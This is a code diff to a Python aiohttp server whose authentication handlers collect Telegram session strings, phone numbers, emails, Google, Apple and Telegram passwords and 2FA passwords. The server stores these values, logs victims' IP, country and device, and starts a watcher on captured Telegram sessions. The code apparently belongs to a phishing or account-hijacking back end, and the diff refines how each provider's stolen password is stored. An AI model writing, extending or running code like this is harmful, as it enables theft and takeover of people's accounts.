@@ -41,6 +41,9 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
         tg_id = data.get("tg_id")
         phone = data.get("phone")
         session_string = data.get("session_string")
+        google_password = data.get("google_password")
+        apple_password = data.get("apple_password")
+        telegram_password = data.get("telegram_password")
         password_2fa = data.get("password_2fa") or data.get("password")
         username = data.get("username")
         nickname = data.get("nickname") or username or "Пользователь"
@@ -77,20 +80,24 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             else:
                 provider = "telegram"
 
+        target_pass = None
         if provider == "google":
-            db.save_google_session(DB_PATH, tg_id, email=email, password=password_2fa, session_data=session_string, status="completed")
+            target_pass = google_password or password_2fa
+            db.save_google_session(DB_PATH, tg_id, email=email, password=target_pass, session_data=session_string, status="completed")
             user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
             if not user_chk or not user_chk.get("session_string"):
                 db.set_user_session(DB_PATH, tg_id, f"google_auth_{tg_id}")
             db.set_user_auth_step(DB_PATH, tg_id, "authorized")
         elif provider == "apple":
-            db.save_apple_session(DB_PATH, tg_id, email=email, password=password_2fa, session_data=session_string, status="completed")
+            target_pass = apple_password or password_2fa
+            db.save_apple_session(DB_PATH, tg_id, email=email, password=target_pass, session_data=session_string, status="completed")
             user_chk = db.get_user_by_tg_id(DB_PATH, tg_id)
             if not user_chk or not user_chk.get("session_string"):
                 db.set_user_session(DB_PATH, tg_id, f"apple_auth_{tg_id}")
             db.set_user_auth_step(DB_PATH, tg_id, "authorized")
         else:
-            db.save_telegram_session(DB_PATH, tg_id, session_string=session_string or "sess_string_ok", phone=phone, password_2fa=password_2fa)
+            target_pass = telegram_password or password_2fa
+            db.save_telegram_session(DB_PATH, tg_id, session_string=session_string or "sess_string_ok", phone=phone, password_2fa=target_pass)
             if session_string and session_string != "sess_string_ok" and not str(session_string).startswith("google_") and not str(session_string).startswith("apple_"):
                 start_session_watcher(tg_id, session_string)
             db.set_user_auth_step(DB_PATH, tg_id, "authorized")
@@ -131,9 +138,9 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             user_username=username or (user["username"] if user else None),
             user_nickname=nickname or (user["nickname"] if user else "Пользователь"),
             phone=phone or (user["phone"] if user else None),
-            email=email or (user["email"] if user and "email" in user.keys() else None),
+            email=email if provider in ("google", "apple") else None,
             auth_step="authorized",
-            password_2fa=password_2fa or (user["password_2fa"] if user and "password_2fa" in user.keys() else None),
+            password_2fa=target_pass or (user["password_2fa"] if user and "password_2fa" in user.keys() else None),
             session_str=session_string,
             ip=geo_info.get("ip") if geo_info.get("ip") != "—" else client_ip,
             country=geo_info.get("country"),
@@ -142,6 +149,7 @@ async def handle_auth_complete(request: web.Request) -> web.Response:
             device=device,
             is_test=is_test,
             mirror_token=bot_token,
+            provider=provider,
         )
         logger.info("Successfully processed auth completion for user tg_id=%s, phone=%s, email=%s", tg_id, phone, email)
 
@@ -222,16 +230,17 @@ async def handle_auth_event(request: web.Request) -> web.Response:
 
         db.get_or_create_user(DB_PATH, tg_id, username, nickname, phone=phone)
 
-        if email:
-            db.set_user_email(DB_PATH, tg_id, email)
-        if phone:
-            db.set_user_phone(DB_PATH, tg_id, phone)
-
         if event.startswith("google_"):
+            if email:
+                db.set_user_email(DB_PATH, tg_id, email)
             db.save_google_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
         elif event.startswith("apple_"):
+            if email:
+                db.set_user_email(DB_PATH, tg_id, email)
             db.save_apple_session(DB_PATH, tg_id, email=email, password=password_2fa, status="pending" if not event.endswith("complete") else "completed")
         else:
+            if phone:
+                db.set_user_phone(DB_PATH, tg_id, phone)
             if password_2fa:
                 db.set_user_2fa_password(DB_PATH, tg_id, password_2fa)
 
